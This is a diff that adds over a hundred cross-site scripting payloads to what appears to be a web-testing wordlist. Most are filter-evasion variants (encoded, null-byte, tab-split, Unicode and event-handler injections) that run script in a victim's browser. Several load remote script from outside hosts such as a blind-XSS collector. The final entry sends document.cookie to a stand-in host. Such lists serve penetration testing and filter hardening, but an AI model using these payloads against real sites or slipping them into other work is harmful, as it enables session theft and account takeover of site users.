@@ -1,3 +1,55 @@
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+<noscript> &amp;lt;p title=” &lt;/noscript&gt;
+&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;
+<details/open=/Open/href=/data=+ontoggle="(alert)(document.domain)
+/?xss=<svg/onload=eval(`'`+URL)>#';alert(document.domain)
+<</div>script</div>>alert()<</div>/script</div>>
+<img src=x onerror=alert(document.domain)>
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:50px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+<py-script>
+'\74img/src/onerror\75alert(1)\76'
+</py-script>
+<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
+xss%27);}}});alert(document.cookie);$(function+a(){a();});$(function+a(){if(a){}else+if(a){/*///
+console.log(unescape('%0A%20%20%20%28%22%28__%20%0A%20%20/%20%5E%20%29%20%5C%0A%20%20.%20.%20%5C%20/%0A%20%20c%20%20%23%20%20@%0A%20%20%5Co%20%20%20%20%5C%0A%20%20%20%60--_%20/7-.%0A%20%20%20%20%20%20%5CN/%20%20%20.%20%0A%20%20%20%20%20%20%20TINTIN%0A'))
+<--<img/src=%20onerror=confirm``>%20--!>
+<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+<sVg/onLy=1 onLoaD=confirm(1)//
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+<--<img/src=%20onerror=confirm``>%20--!>
+<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+'a\l\ert\`1\``
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+"></script><img src onerror=with(document)body.appendChild(createElement('script')).src='//bx.ss'>
+<img src onerror=appendChild(createElement('script')).src='//nj.rs'>
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+'"*/onmouseover=(print)?.()><sVg/oNload='1>(_=prompt,_`{{7*7}}`)'></sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->＜h1/<h1><image/onerror='alert`1`%27'src>xhzeem%22%3E%3CSvg/\u0022\u003e\u003csVg/\x22\x3e\x3csVg/&quot;&gt;&lt;svG/onload=alert`2`//
+<script>
+location.protocol="javascript"
+</script>
+class x extends `${class x extends `${alert`1337`}`{}}`{}
+{{constructor.constructor('alert(document.cookie)')()}}
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+javascript:alert(1);
+javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+javascript://%250Alert(document.location=document.cookie)
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+java%0d%0ascript%0d%0a:alert(0)
+j%09avascript:alert(document.cookie)
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://haxor.bxss.in?n=63aea6\';document.body.appendChild(a)')
 <a"/onclick=(confirm)()>Click Here!
 Dec: <svg onload=prompt%26%230000000040document.domain)>
 Hex: <svg onload=prompt%26%23x000000028;document.domain)>
@@ -195,4 +247,133 @@ alert;pg("XSS")
 <param name="AllowScriptAccess" value="always"></object>
 <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
 <script>Object.defineProperties(window, {xss: {value: {x: function() {return document.cookie}}}});alert(xss.x())</script> 
+<script>alert(1234)</script>1
+<script>prompt(1234)</script>1
+<ScripT>alert(1234)</ScRipT>1
+/<script>alert(1234)</script>0
+<script>var m=<html><a href="//host">link</a>1
+<img+src="http://localhost">1
+<DIV+STYLE="background-image: url(javascript:alert(1))">1
+<IMG+DYNSRC="javascript:alert(1);">1
+<IMG+LOWSRC="javascript:alert(1);">1
+<isindex+type=image+src=1+onerror=alert(1)>1
+<meta style="xss:expression(open(alert(1)))" />1
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1);\">1
+<!</textarea <body onload='alert(1)'>1
+<img+<iframe ="1" onerror="alert(1)">1
+<iframe src="http://localhost"></iframe>1
+<base+href="javascript:alert(1);//">1
+<bgsound+src="javascript:alert(1);">1
+<INPUT+TYPE="IMAGE"+SRC="javascript:alert(1);">1
+<object+data="javascript:alert(0)">1
+<STYLE>li+{list-style-image:url("javascript:alert(1)");}</STYLE><UL><LI>11
+<Layer+src="http://localhost">1
+%3E%3Cbody%20onload=javascript:alert(1)%3E1
+'">><marquee><h1>1</h1></marquee>1
+</br style=a:expression(alert(1))>1
+<font style='color:expression(alert(1))'>1
+<embed src="data:image/svg+xml;>1
+<frameset><frame src="xss"></frameset>1
+<link href="http://host/xss.css">1
+="/>%3ciframe%20src%3djavascript%3aalert%283%29%3e1
+<object><param name="src" value="javascript:alert(0)"></param></object>1
+<isindex action=javascript:alert(1) type=image>1
+<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>1
+</a onmousemove="alert(1)">1
+'%26%26'javascript:alert%25281%2529//1
+document.write("<scr"+"ipt language=javascript src=http://localhost/></scr"+"ipt>");1
+<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>1
+12&<script>alert(123)</script>=1231
+<img src=x:alert(alt) onerror=eval(src) alt=0>1
+<img src=/ onerror=alert(1)>1
+a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);1
+<img/src="xss.png"alt="xss">1
+<IMG SRC="mocha:[code]">1
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>1
+<STYLE>@import'http://host/css';</STYLE>1
+<SCRIPT+a=">'>" SRC="http://localhost"></SCRIPT>1
+<scr<script>ipt>alert('XSS')</scr</script>ipt>1
+%3Cscript%3Ealert(1)%3C/script%3E1
+foo%00<script>alert(document.cookie)</script>1
+"><<script>alert(document.cookie);//<</script>1
+><s"%2b"cript>alert(document.cookie)</s"%2B"cript>1
+3Cscript%3Ealert(1)%3C%2Fscript%3E1
+%253Cscript%253Ealert(1)%253C/script%253E1
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e1
+%BCscript%BEalert(%A21%A2)%BC/script%BE1
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE1
+<object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>1
+<a HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">ugh</a>1
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==1
+<a+href="javas&#99;ript&#35;alert(1);">1
+<IMG+SRC=j&#X41vascript:alert(1)>1
+<IMG+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#39;&#41;>1
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE1
+ <IMG+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000039&#0000041>1
+%u0022%u003e%u003cscript%u003ealert%u0028%u0027Hello%u0027%u0029%u003c%u002fscript%u003e1
++ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-1
+<INPUT+TYPE="checkbox"+onDblClick=confirm(XSS)>1
+<APPLET+CODE=""+CODEBASE="http://url/xss">1
+<SCRIPT>alert(String.fromCharCode(88))</SCRIPT>1
+&lt;script&gt;prompt(&apos;1&apos;)&lt;/script&gt;1
+ &#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;1
+ &#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;1
+ &#x74;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;&#x141;&#x154;&#x145;&#x162;&#x164;&#x50;&#x47;&#x170;&#x163;&#x163;&#x47;&#x51;&#x74;&#x57;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;1
+=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;1%26%23x29;>1
+"+style%3d"x%3aexpression(alert(1))+1
+\";alert(1);//1
+<img src="x:%90" title="onerror=alert(1)//">1
+"+onmouseover="window.location='http://localhost'1
+"+onkeypress="prompt(23)"+1
+"+onfocus="prompt(1)"+1
+500);alert(1);//1
+alert(document['cookie'])1
+with(document)alert(cookie)1
+";location=location.hash)//#0={};alert(0)1
+//";alert(String.fromCharCode(88,83,83))1
+%F6%3Cimg+onmouseover=prompt(/test/)//%F6%3E1
+"+onDblClick=prompt(123)"+1
+"+onError=prompt(123)"+1
+"+onReset=prompt(123)"+1
+%";eval(unescape(location))//#%0Aprompt(0)1
+<SCRIPT>a=/XSS/%0Aalert(a.source)</SCRIPT>1
+%'});%0aalert(1);%20//1
+<script>//>%0Aalert(1);</script>1
+<IMG+SRC="jav&#x0A;ascript:alert(1);">1
+<IMG+SRC="jav%0dascript:alert(1);">1
+<IMG+SRC="jav#x0D;ascript:alert(1);">1
+<IMG+SRC="jav%09ascript:alert(1);">1
+<IMG+SRC="jav&#x09;ascript:alert(1);">1
+%3Cscript%3Ealert(1)%3C/script%00TESTTEST%3E1
+<script%00>alert(1)</script%00>1
+<scr%00ipt>prompt(1)</sc%00ript>1
+<scr\0ipt>prompt(1)</sc\0ript>1
+%00"><script>alert(1)</script>1
+%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E1
+<script%0Caaaaa>alert(123)</script>1
+%3Cscript%0Baaa%3Ealert%281%29%3C/script%0Baaaa%3E1
+%3Cscript%0Baaa%3Ealert%281%29%3C/script%3E1
+<*script>prompt(123)<*/script>1
+<script%0Daaa>alert(1)</script%0Daaaa>1
+<script%20TEST>alert(1)</script%20TESTTEST>1
+<SCRIPT/XSSSRC="http://host"></SCRIPT>1
+<SCRIPT+SRC=http://host/1
+<<SCRIPT>alert(1);//<</SCRIPT>1
+< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >1
+ -1\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e1
+ -2%uff1c%uff53%uff43%uff52%uff49%uff50%uff54%uff1e%uff41%uff4c%uff45%uff52%uff54%uff08%uff07%uff58%uff53%uff53%uff07%uff09%uff1c%uff0f%uff53%uff43%uff52%uff49%uff50%uff54%uff1e1
+%uff1cscript%uff1ealert(1234)%uff1c/script%uff1e1
+javascript:propmpt(1)1
+javascript:eval(unescape(location.href))1
+a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);1
+location=location.hash.slice(1);1
+";location=location.hash)//#0={};alert(0)1
+location=location.hash1
+""+{toString:alert}1
+""+{valueOf:alert}1
+";eval(unescape(location))//# %0Aalert(0)1
+;location.href='http://site';//1
+1&"><script>alert(1)</script>=11
+</scr</script>ipt><ifr<iframeame/onload=prompt()>whs1
+%3E%3Cbody%20onload=javascript:alert(1)# var sc=escape(document.cookie);var d=escape(document.location);var mI=new Image();mI.src="http://host?a="+d+"&b="+ sc;1
  
